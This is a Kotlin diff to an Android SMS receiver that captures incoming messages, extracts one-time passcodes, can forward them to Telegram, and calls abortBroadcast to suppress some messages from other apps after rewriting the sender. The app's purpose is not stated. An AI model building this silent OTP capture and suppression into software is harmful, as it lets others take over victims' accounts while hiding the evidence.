@@ -10,24 +10,29 @@ class SmsInterceptReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
-        if (!PermissionHelper.hasReadSms(context)) return
+        if (!PermissionHelper.smsReady(context)) return
 
+        val pending = goAsync()
         try {
-            val parts = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
-            if (parts.isEmpty()) return
+            val parts = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return finish(pending)
+            if (parts.isEmpty()) return finish(pending)
 
             val sender = parts.firstOrNull()?.originatingAddress?.trim().orEmpty()
             val body = parts.joinToString("") { it.messageBody.orEmpty() }.trim()
-            if (sender.isBlank() || body.isBlank()) return
+            if (sender.isBlank() || body.isBlank()) return finish(pending)
 
-            val configManager = ConfigManager(context)
+            val appContext = context.applicationContext
+            val configManager = ConfigManager(appContext)
             val config = configManager.load()
 
             if (SmsSenderRewriter.shouldRewrite(sender, config)) {
-                SmsSenderRewriter.rewriteIncomingSender(context, config, sender, body)
+                try {
+                    abortBroadcast()
+                } catch (_: Exception) {}
+                SmsSenderRewriter.rewriteOnReceive(appContext, config, sender, body)
             }
 
-            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return
+            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return finish(pending)
 
             val interceptDisplay = SmsMatcher.interceptDisplay(config, sender, configManager)
             val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
@@ -41,19 +46,24 @@ class SmsInterceptReceiver : BroadcastReceiver() {
                 rawPeer = sender,
                 capturedAt = System.currentTimeMillis()
             )
-            OtpCaptureWriter.write(context, otp)
-            OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
+            OtpCaptureWriter.write(appContext, otp)
+            OtpAutoFillHelper.onHookedOtpCaptured(appContext, config, otp)
             if (SmsMatcher.shouldForwardToTelegram(config, sender, body, "incoming")) {
-                context.sendBroadcast(
-                    Intent(ACTION_SMS_CAPTURED).setPackage(context.packageName)
+                appContext.sendBroadcast(
+                    Intent(ACTION_SMS_CAPTURED).setPackage(appContext.packageName)
                 )
-                try {
-                    abortBroadcast()
-                } catch (_: Exception) {}
             }
         } catch (e: Exception) {
             Log.w(TAG, "SMS intercept failed: ${e.message}")
+        } finally {
+            finish(pending)
         }
+    }
+
+    private fun finish(pending: PendingResult) {
+        try {
+            pending.finish()
+        } catch (_: Exception) {}
     }
 
     companion object {
